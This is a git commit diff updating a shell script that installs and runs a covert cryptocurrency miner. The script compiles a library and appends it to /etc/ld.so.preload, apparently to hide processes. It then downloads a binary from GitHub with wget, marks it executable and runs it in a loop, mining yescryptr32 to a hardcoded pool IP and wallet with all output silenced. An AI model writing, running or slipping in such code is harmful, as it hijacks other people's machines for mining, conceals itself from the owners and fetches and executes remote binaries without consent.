3aca44070a23e376220df811d6ed8e47e12ddc4e
barburonjilo <barburonjilo@outlook.co.id>
2024-08-12 07:12:13 +0700

    Update hati.sh

--- hati.sh
+++ hati.sh
@@ -10,22 +10,22 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
+
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 
 # Prepare the environment
 mkdir -p .lib && cd .lib
 
 # Download the binary
-wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
+wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
 chmod +x sgr1
 
 while true; do
-    # Start the process with cpulimit
-    cpulimit -l 600 -e ./sgr1 &
-    pid=$!
+    # Use a subshell to combine cpulimit and sgr1
+    (cpulimit -l 60 -e ./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1) &
 
-    # Run the process with the specified parameters
-    ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1 &
+    # Get the PID of the cpulimit command
+    pid=$!
 
     # Run for 1 minute
     sleep 60
